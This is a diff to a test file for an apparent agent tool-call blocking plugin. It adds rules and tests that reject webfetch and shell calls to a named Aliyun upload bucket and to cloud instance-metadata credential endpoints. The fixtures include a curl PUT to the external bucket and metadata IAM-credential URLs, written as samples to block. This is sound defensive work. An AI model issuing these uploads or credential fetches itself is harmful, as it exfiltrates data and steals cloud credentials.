@@ -68,8 +68,8 @@ function nest(depth: number, leaf: unknown): unknown {
   return v
 }
 
-test("fixtures: two rules, exact host first", () => {
-  assert.equal(BLOCKED.length, 2)
+test("fixtures: four rules, exact incident host first", () => {
+  assert.equal(BLOCKED.length, 4)
   assert.ok(BLOCKED.every((b) => b.why.length > 0))
   const hit = findBlocked(DEAD_URL)
   assert.ok(hit)
@@ -256,6 +256,113 @@ test("tool.execute.before: full guidance once per session, terse repeats", async
   )
   // A different session still gets full guidance.
   await assert.rejects(hook(mk("s2"), { args }), (e: unknown) => String(e).includes(FULL_MARKER))
+})
+
+// Cohere 2026-10-26 capture fixtures (same fragment discipline as DEAD_URL:
+// this file must never contain a contiguous rule-3 or rule-4 match).
+const UPLOAD_BUCKET_URL = [
+  "https://sanmaohe",
+  ".oss-cn-beijing",
+  ".aliyuncs.com/upload/test.bin",
+].join("")
+const UPLOAD_BUCKET_DUALSTACK = [
+  "https://sanmaohe",
+  ".oss-cn-beijing.oss",
+  ".aliyuncs.com/upload/test.bin",
+].join("")
+const META_IP = ["http://169", ".254.169.254/latest/meta-data/iam/security-credentials/"].join("")
+const META_IP_ALI = ["100.100", ".100.200"].join("") // bare, no scheme
+const META_NAME = ["http://metadata", ".google.internal/computeMetadata/v1/instance/"].join("")
+
+test("rules 3-4: hard-block the Cohere 2026-10-26 capture shapes", async () => {
+  const hook = await beforeHook()
+  const input = { tool: "webfetch", sessionID: "r34-session", callID: "call-1" }
+  const bucketShapes: unknown[] = [
+    { url: UPLOAD_BUCKET_URL, format: "markdown" },
+    { urls: [CLEAN_URLS[0], UPLOAD_BUCKET_DUALSTACK], maxCharacters: 5000 },
+    { command: `curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary "PROBE_PAYLOAD" ${UPLOAD_BUCKET_URL} -w "HTTP:%{http_code}"` },
+  ]
+  const metaShapes: unknown[] = [
+    { url: META_IP },
+    { url: "http://" + META_IP_ALI + "/latest/meta-data/" },
+    { url: META_NAME },
+    { server: META_IP_ALI }, // bare metadata IP as a plain argument value
+  ]
+  for (const args of bucketShapes) {
+    await assert.rejects(
+      hook(input, { args }),
+      (err: unknown) => {
+        assert.match(String(err), /Blocked by block-proxy-artifacts policy/)
+        assert.match(String(err), /upload-target bucket/)
+        return true
+      },
+    )
+  }
+  for (const args of metaShapes) {
+    await assert.rejects(
+      hook(input, { args }),
+      (err: unknown) => {
+        assert.match(String(err), /Blocked by block-proxy-artifacts policy/)
+        assert.match(String(err), /instance-metadata endpoint/)
+        return true
+      },
+    )
+  }
+})
+
+test("rules 3-4: near-misses pass through untouched", async () => {
+  const hook = await beforeHook()
+  const nearMisses: unknown[] = [
+    // the ordinary blog that 'https://sanmaohe' actually completes to locally
+    { url: "https://sanmaoheling.com/blogs/news.atom" },
+    { url: "https://my-backup.oss-cn-beijing.aliyuncs.com/legit-object.tar.gz" },
+    { command: "grep -ri sanmaohe ./docs/" }, // label alone, no aliyuncs endpoint
+    { url: "http://169.254.1.1/other-link-local" }, // not the metadata address
+    { url: "http://" + ["1", ".169.254", ".169.254"].join("") + "/longer-address" }, // boundary: digit-prefixed
+    { url: "http://100.100.100.201/" }, // boundary: neighbor address
+    { version: ["169.254", ".169.2540", "-1"].join("") }, // boundary: trailing digit
+    { url: "https://metadata.example.com/google/internal" },
+  ]
+  for (const input of nearMisses) {
+    assert.equal(findBlocked(input), null, `should pass: ${JSON.stringify(input)}`)
+  }
+})
+
+test("rules 3-4: family-specific guidance; legacy rules keep publisher guidance", async () => {
+  const hook = await beforeHook()
+  const msg = async (args: unknown, sessionID: string) => {
+    try {
+      await hook({ sessionID, tool: "webfetch", callID: "c" }, { args })
+      return ""
+    } catch (e) {
+      return String(e)
+    }
+  }
+  // rule 4 first-hit guidance: credential framing, no fetch-elsewhere advice
+  assert.match(await msg({ url: META_IP }, "s-meta"), /credential/)
+  assert.doesNotMatch(await msg({ url: META_IP }, "s-meta2"), /publisher URL/)
+  // rule 4 repeats: terse credential one-liner, no IAM paragraph
+  const metaRepeat = await msg({ url: META_IP }, "s-meta")
+  assert.match(metaRepeat, /credential surface/)
+  assert.doesNotMatch(metaRepeat, /IAM/)
+  // rule 3 first-hit guidance: upload framing
+  assert.match(await msg({ url: UPLOAD_BUCKET_URL }, "s-bucket"), /upload endpoint/)
+  // rule 1 unchanged: dead-relay publisher guidance
+  assert.match(await msg({ url: DEAD_URL }, "s-relay"), /publisher URL/)
+  assert.match(await msg({ url: DEAD_URL }, "s-relay"), /relay middlebox/)
+})
+
+test("V2 setup(): rules 3-4 block through the tool domain too", async () => {
+  const hook = await v2BeforeHook()
+  for (const input of [{ url: UPLOAD_BUCKET_DUALSTACK }, { url: META_NAME }, { command: "curl -m 2 http://" + META_IP_ALI + "/latest/" }]) {
+    assert.throws(
+      () => hook(v2Event("v2-r34", input)),
+      (err: unknown) => {
+        assert.match(String(err), /Blocked by block-proxy-artifacts policy/)
+        return true
+      },
+    )
+  }
 })
 
 test("self-compatibility: blocklist never matches the plugin's own sources", () => {
